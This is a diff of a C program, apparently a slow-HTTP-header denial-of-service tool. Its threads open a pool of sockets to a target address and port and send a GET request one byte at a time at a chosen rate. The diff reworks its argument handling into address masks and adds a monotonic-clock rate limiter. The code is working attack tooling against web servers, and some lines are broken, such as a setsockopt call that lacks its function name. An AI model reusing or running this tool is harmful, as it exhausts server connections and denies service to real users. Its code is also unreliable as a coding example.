@@ -6,22 +6,20 @@
 
 unsigned int headbuffer_total;
 unsigned int headbuffer_produced;
-unsigned int headbuffer_received;
 
 unsigned int headbuffer_per_second;
-unsigned int headbuffer_duration;
 double headbuffer_elapsed_time;
 
-char *headbuffer_dest_ip;
-char *headbuffer_src_ip;
-int headbuffer_src_port;
+char headbuffer_dest_ip[16];
+char headbuffer_src_ip[16];
+
 int headbuffer_dest_port;
 
-int headbuffer_generated_count;
-short headbuffer_timed_finisher;
+int headbuffer_src_ip_mask;
+int headbuffer_dest_ip_mask;
 
-clock_t headbuffer_global_time;
-clock_t headbuffer_global_elapsed_time;
+char headbuffer_now_src_ip[16];
+char headbuffer_now_dest_ip[16];
 
 pthread_mutex_t headbuffer_mutex = PTHREAD_MUTEX_INITIALIZER;
 pthread_cond_t headbuffer_cond = PTHREAD_COND_INITIALIZER;
@@ -34,24 +32,23 @@ clock_t *headbuffer_clocks;
 unsigned int headbuffer_current;
 int *headbuffer_http_cursor;
 
-int debug_log = 0;
+int headbuffer_maximum = 5;
+
+struct timespec headbuffer_time1, headbuffer_time2;
 
 void header_buffering_print_usage(int mode) {
 
 	if (mode == 1)
 		printf(
-				"header buffering Usage : [Src-IP] [Dest-IP] [# thread] [# attacks(0 for INF)] [Src-Port] [Dest-Port] \n");
+				"header buffering Usage : [Src-IP/mask] [Dest-IP/mask] [Dest-Port] [# requests/s]\n");
 }
 
 void* generate_header_buffering1(void *data) {
 	int thread_id = *((int*) data);
-	clock_t thread_clock;
 
 	while (1) {
 
 		pthread_mutex_lock(&headbuffer_mutex);
-		thread_clock = clock();
-
 		//printf("Log[%d] : T<%d>, S<%d>\n", debug_log++, headbuffer_current,
 		//	headbuffer_sockets[headbuffer_current]);
 
@@ -63,8 +60,9 @@ void* generate_header_buffering1(void *data) {
 
 			int sdbf = 2;
 
-			if((headbuffer_sockets[headbuffer_current],SOL_SOCKET,SO_SNDBUF,(const char*)&sdbf, sizeof(sdbf))==-1)
-						perror("setsockopt failure.\n");
+			if ((headbuffer_sockets[headbuffer_current], SOL_SOCKET, SO_SNDBUF, (const char*) &sdbf, sizeof(sdbf))
+					== -1)
+				perror("setsockopt failure.\n");
 
 			if (headbuffer_sockets[headbuffer_current] == -1)
 				perror("sock creation failed\n");
@@ -78,17 +76,29 @@ void* generate_header_buffering1(void *data) {
 					(struct sockaddr*) &servaddr, sizeof(servaddr)) != 0)
 				perror("connect failed\n");
 
-			headbuffer_src_port++;
 			printf("sock value : %d\n", headbuffer_sockets[headbuffer_current]);
-			if (headbuffer_src_port >= 65000)
-				headbuffer_src_port = 10000;
 		}
 
-		double elapsed = ((double) (thread_clock
-				- headbuffer_clocks[headbuffer_current])) / CLOCKS_PER_SEC;
-
-		if (elapsed < 1.0) {
+		//Conditions begin.
+		if (headbuffer_produced >= headbuffer_per_second) {
 			pthread_cond_wait(&headbuffer_cond, &headbuffer_mutex);
+		}
+
+		//Get Time
+		clock_gettime(CLOCK_MONOTONIC, &headbuffer_time2);
+		double headbuffer_elapsed_time = (headbuffer_time2.tv_sec
+				- headbuffer_time1.tv_sec)
+				+ ((headbuffer_time2.tv_nsec - headbuffer_time1.tv_nsec)
+						/ 1000000000.0);
+
+		//If time > 1.0
+		if (headbuffer_elapsed_time >= 1.0) {
+
+			printf("-.\n");
+			headbuffer_produced = 0;
+
+			clock_gettime(CLOCK_MONOTONIC, &headbuffer_time1);
+			pthread_cond_signal(&headbuffer_cond);
 		}
 
 		int sent_size = -1;
@@ -98,11 +108,14 @@ void* generate_header_buffering1(void *data) {
 					headbuffer_request
 							+ headbuffer_http_cursor[headbuffer_current], 1);
 
-			printf("Sending From Socket[%d], wish:<%c>, sent size : %d\n",
-					headbuffer_sockets[headbuffer_current], *(headbuffer_request
-					+ headbuffer_http_cursor[headbuffer_current]),sent_size);
+			headbuffer_produced++;
+			headbuffer_total++;
 
-			headbuffer_clocks[headbuffer_current] = clock();
+			printf("%d Socket[%d] send %c : %d\n", headbuffer_produced,
+					headbuffer_sockets[headbuffer_current],
+					*(headbuffer_request
+							+ headbuffer_http_cursor[headbuffer_current]),
+					sent_size);
 
 			headbuffer_http_cursor[headbuffer_current] += 1;
 
@@ -114,87 +127,38 @@ void* generate_header_buffering1(void *data) {
 			headbuffer_current++;
 		}
 
-		if (headbuffer_current >= headbuffer_total) {
+		if (headbuffer_current >= headbuffer_maximum) {
 			headbuffer_current = 0;
 		}
 
-		pthread_cond_signal(&headbuffer_cond);
 		pthread_mutex_unlock(&headbuffer_mutex);
 	}
 
 	return 0;
 
-}
-
-void* generate_header_buffering2(void *data) {
-	int thread_id = *((int*) data);
-	clock_t thread_clock;
-
-	int sock;
-	while (1) {
-
-		pthread_mutex_lock(&headbuffer_mutex);
-		thread_clock = clock();
-		headbuffer_elapsed_time = ((double) (thread_clock
-				- headbuffer_global_elapsed_time)) / CLOCKS_PER_SEC;
-
-		if (headbuffer_elapsed_time >= headbuffer_duration) {
-			pthread_mutex_unlock(&headbuffer_mutex);
-			pthread_cond_broadcast(&headbuffer_cond);
-			headbuffer_timed_finisher = 1;
-			return 0;
-		}
-
-		if (headbuffer_produced >= headbuffer_per_second) {
-			pthread_cond_wait(&headbuffer_cond, &headbuffer_mutex);
-		}
-
-		int sock = tcp_make_connection(inet_addr(headbuffer_src_ip),
-				inet_addr(headbuffer_dest_ip), headbuffer_src_port,
-				headbuffer_dest_port, SOCK_PACKET);
-		headbuffer_src_port++;
-		if (headbuffer_src_port >= 65000)
-			headbuffer_src_port = 10000;
-
-		send(sock, headbuffer_request, __HEADER_BUFFERING_REQUEST_MSG_SIZE__,
-				0);
-
-		headbuffer_produced++;
-		headbuffer_total++;
-		headbuffer_generated_count++;
-
-		pthread_cond_signal(&headbuffer_cond);
-		close(sock);
-		pthread_mutex_unlock(&headbuffer_mutex);
-
-	}
-
-	return 0;
 }
 
 void* headbuffer_time_check(void *data) {
-	int thread_id = *((int*) data);
-	clock_t t1;
-	t1 = clock();
-	headbuffer_global_elapsed_time = clock();
-	double time_taken;
 
 	while (1) {
 		pthread_mutex_lock(&headbuffer_mutex);
+		//Get Time
+		clock_gettime(CLOCK_MONOTONIC, &headbuffer_time2);
+		double headbuffer_elapsed_time = (headbuffer_time2.tv_sec
+				- headbuffer_time1.tv_sec)
+				+ ((headbuffer_time2.tv_nsec - headbuffer_time1.tv_nsec)
+						/ 1000000000.0);
 
-		headbuffer_global_time = clock();
-		headbuffer_elapsed_time = ((double) (headbuffer_global_time
-				- headbuffer_global_elapsed_time)) / CLOCKS_PER_SEC;
-		if (headbuffer_timed_finisher == 1)
-			return 0;
-		time_taken = ((double) (headbuffer_global_time - t1)) / CLOCKS_PER_SEC;
+		//If time > 1.0
+		if (headbuffer_elapsed_time >= 1.0) {
 
-		if (time_taken >= 1.0) {
+			printf("-.\n");
 			headbuffer_produced = 0;
-			t1 = clock();
-			time_taken = 0;
+
+			clock_gettime(CLOCK_MONOTONIC, &headbuffer_time1);
 			pthread_cond_signal(&headbuffer_cond);
 		}
+
 		pthread_mutex_unlock(&headbuffer_mutex);
 	}
 }
@@ -217,75 +181,53 @@ void header_buffering_run(char *argv[], int mode) {
 	 strcat(headbuffer_request, "\r\n");
 	 fclose(get_f);
 	 */
+
 	strcpy(headbuffer_request, "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n");
 
 	printf("HTTP header msg:\n%s\n", headbuffer_request);
 
-	headbuffer_src_ip = (char*) malloc(sizeof(char) * 20);
-	headbuffer_dest_ip = (char*) malloc(sizeof(char) * 20);
 	int argc = 0;
-	headbuffer_generated_count = 0;
-	headbuffer_timed_finisher = 0;
+
 	while (argv[argc] != NULL) {
 		argc++;
 	}
 
-	if (mode == 1 && argc != 6) {
-		header_buffering_print_usage(mode);
-		return;
-	} else if (mode == 2 && argc != 7) {
+	if (mode == 1 && argc != 4) {
 		header_buffering_print_usage(mode);
 		return;
 	}
 
-	strcpy(headbuffer_src_ip, argv[0]);
-
 	headbuffer_produced = 0;
+	get_ip_from_ip_addr(argv[0], headbuffer_src_ip);
+	headbuffer_src_ip_mask = get_mask_from_ip_addr(argv[0]);
+	strcpy(headbuffer_now_src_ip, headbuffer_src_ip);
+
+	get_ip_from_ip_addr(argv[1], headbuffer_dest_ip);
+	headbuffer_dest_ip_mask = get_mask_from_ip_addr(argv[1]);
+	strcpy(headbuffer_now_dest_ip, headbuffer_dest_ip);
+
 	if (mode == 1) {
-		headbuffer_total = atoi(argv[3]);
-		headbuffer_src_port = atoi(argv[4]);
 
+		headbuffer_per_second = atoi(argv[3]);
 		//socket preparation & clock preparation
-		headbuffer_sockets = (int*) malloc(sizeof(int) * headbuffer_total);
+		headbuffer_sockets = (int*) malloc(sizeof(int) * headbuffer_maximum);
 
-		headbuffer_clocks = (clock_t*) malloc(
-				sizeof(clock_t) * headbuffer_total);
-		headbuffer_http_cursor = (int*) malloc(sizeof(int) * headbuffer_total);
+		headbuffer_http_cursor = (int*) malloc(
+				sizeof(int) * headbuffer_maximum);
 
 		headbuffer_current = 0;
 
 		int tmp;
-		for (tmp = 0; tmp < headbuffer_total; tmp++) {
+		for (tmp = 0; tmp < headbuffer_maximum; tmp++) {
 			headbuffer_sockets[tmp] = -2;
-			headbuffer_clocks[tmp] = clock();
 			headbuffer_http_cursor[tmp] = 0;
 		}
 
-		headbuffer_dest_port = atoi(argv[5]);
-
-		if (headbuffer_total == 0)
-			headbuffer_total = __UINT_MAXIMUM__;
+		headbuffer_dest_port = atoi(argv[2]);
 
 	}
 
-	if (mode == 2) {
-		headbuffer_total = 0;
-		headbuffer_per_second = atoi(argv[3]);
-		headbuffer_duration = atoi(argv[4]);
-		if (headbuffer_duration == 0)
-			headbuffer_duration = __UINT_MAXIMUM__;
-
-		if (headbuffer_per_second == 0)
-			headbuffer_per_second = __UINT_MAXIMUM__;
-
-		headbuffer_src_port = atoi(argv[5]);
-		headbuffer_dest_port = atoi(argv[6]);
-	}
-
-	int num_threads = atoi(argv[2]);
-
-	headbuffer_dest_ip = argv[1];
-	strcpy(headbuffer_dest_ip, argv[1]);
+	int num_threads = 10;
 
 	int *generate_thread_id, *receive_thread_id;
 	pthread_t *generate_thread, *receive_thread;
@@ -307,7 +249,7 @@ void header_buffering_run(char *argv[], int mode) {
 		if (mode == 2) {
 			printf("thread %d created\n", i);
 			pthread_create(&generate_thread[i], NULL,
-					generate_header_buffering2, (void*) &generate_thread_id[i]);
+					generate_header_buffering1, (void*) &generate_thread_id[i]);
 			/*RECEIVE THREAD DEACTIVATION*/
 			//pthread_create(&receive_thread[i],NULL,receive_get,(void*)&receive_thread_id[i]);
 		}
@@ -333,9 +275,6 @@ void header_buffering_run(char *argv[], int mode) {
 
 	free(generate_thread_id);
 	free(generate_thread);
-	free(headbuffer_src_ip);
-	free(headbuffer_dest_ip);
-	free(headbuffer_sockets);
-	free(headbuffer_clocks);
+
 	return;
 }
